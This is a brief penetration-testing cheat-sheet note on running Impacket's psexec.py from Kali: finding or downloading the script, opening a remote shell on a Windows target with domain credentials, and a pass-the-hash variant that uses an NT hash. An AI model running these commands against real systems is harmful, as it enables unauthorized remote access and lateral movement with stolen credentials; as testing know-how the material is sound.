---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
```python - kali
python3 /usr/share/doc/python3-impacket/examples/psexec.py --help
```

or

```bash - kali
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py
```

#### Shell with psexec.py
```python - kali
psexec.py $DOMAIN/$USER:$PASSWORD@$TARGET
```

#### Passing the hash (blank LM hash)
```bash  - kali
psexec.py $DOMAIN/$USER@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:$HASH
```


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
